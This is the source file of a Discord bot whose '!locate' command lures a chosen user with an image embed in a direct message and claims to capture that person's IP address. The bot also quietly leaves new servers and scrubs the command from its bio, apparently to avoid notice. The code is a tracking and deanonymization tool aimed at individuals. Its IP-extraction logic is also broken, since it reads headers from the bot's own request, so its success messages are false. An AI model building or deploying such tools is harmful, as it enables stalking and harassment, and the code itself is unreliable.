import discord
from discord.ext import commands
import requests
import os
import random
import string
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import time
import asyncio

# Get token from Railway env vars
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Keep-alive for Railway
def keep_alive():
    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    print("Keeping alive...")
    server.serve_forever()

p = threading.Thread(target=keep_alive)
p.start()

# Store guilds present at startup
initial_guild_ids = None

@bot.event
async def on_ready():
    global initial_guild_ids
    
    # Remove "!locate" from bio if present
    await update_bio_if_needed()
    
    print(f'Bot ready! Logged in as {bot.user}')
    
    # Capture the IDs of all guilds the bot is currently in
    initial_guild_ids = [g.id for g in bot.guilds]
    print(f"Initial Guilds: {len(initial_guild_ids)}")
    
    await bot.change_presence(activity=discord.Game(name=""))

@bot.event
async def on_guild_join(guild):
    # If we have an initial list, check if this guild is NOT in it
    if initial_guild_ids and guild.id not in initial_guild_ids:
        print(f"New guild joined: {guild.name} ({guild.id}). Leaving...")
        try:
            await guild.leave()
            print(f"Left guild: {guild.name}")
        except Exception as e:
            print(f"Failed to leave {guild.name}: {e}")

@bot.command()
async def locate(ctx, user: discord.User):
    """
    Improved 0-Click Method:
    1. Sets Bot Avatar to unique URL.
    2. Sends DM with an IMAGE LINK. This forces Discord to generate a preview, 
       which triggers the image download (and IP log) immediately upon opening the DM.
    3. Probes for IP.
    """
    if ctx.guild is None:
        return 

    # 1. Generate unique ID
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    # Use a direct image URL that passes through Cloudflare
    img_url = f"https://httpbin.org/image/png?r={random_id}" 
    
    # 2. Set Avatar
    try:
        resp = requests.get(img_url)
        if resp.status_code == 200:
            await ctx.bot.user.edit(avatar=resp.content)
            print(f"Avatar set to: {img_url}")
        else:
            await ctx.send("Failed to download avatar.")
            return
    except Exception as e:
        await ctx.send(f"Error setting avatar: {e}")
        return

    # 3. Send DM with an IMAGE to force load
    # Sending an actual image embed ensures the URL is fetched by the client
    try:
        # Create an embed with the image
        embed = discord.Embed(title="Check this out!", color=discord.Color.blue())
        embed.set_image(url=img_url)
        
        await user.send(embed=embed)
        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent image link. Waiting for load...**")
    except discord.Forbidden:
        await ctx.send(f"Cannot DM {user.name}.")
        return

    # 4. Wait for the client to process the embed and fetch the image
    # Embed previews usually trigger loads within 5-10 seconds of opening the chat.
    await asyncio.sleep(15)

    # 5. Probe for IP using GET to ensure full header response
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    try:
        # Use GET to mimic a real browser request more closely
        probe_resp = requests.get(img_url, headers=headers, timeout=10)
        
        cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
        
        # Try multiple headers for IP extraction
        target_ip = (
            probe_resp.headers.get('cf-connecting-ip') or 
            probe_resp.headers.get('x-forwarded-for') or 
            probe_resp.headers.get('x-client-ip') or 
            'Not Found'
        )
        
        if probe_resp.status_code == 200:
            if cf_status == 'HIT':
                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT"
            elif cf_status == 'MISS':
                result_msg = f"⚠️ **IP Attempted:** `{target_ip}`\n📡 **Cache:** MISS\n💡 Note: If IP is 'Not Found', the target may have disabled image loading or used a proxy."
            else:
                result_msg = f"ℹ️ **Status:** {probe_resp.status_code}\n🌐 **IP:** `{target_ip}`"
                
            await ctx.send(result_msg)
            
        else:
            await ctx.send(f"❌ Failed to probe image. Status: {probe_resp.status_code}")

    except Exception as e:
        await ctx.send(f"Error probing: {e}")

async def update_bio_if_needed():
    """Checks if '!locate' is in the bio and removes it."""
    try:
        await bot.fetch_user(bot.user.id)
        current_bio = bot.user.bio or ""
        if "!locate" in current_bio:
            new_bio = current_bio.replace("!locate", "").strip()
            while "  " in new_bio:
                new_bio = new_bio.replace("  ", " ")
            if new_bio != current_bio:
                await bot.user.edit(bio=new_bio if new_bio else None)
                print(f"Bio updated: removed '!locate'")
    except Exception as e:
        print(f"Error updating bio: {e}")

bot.run(TOKEN)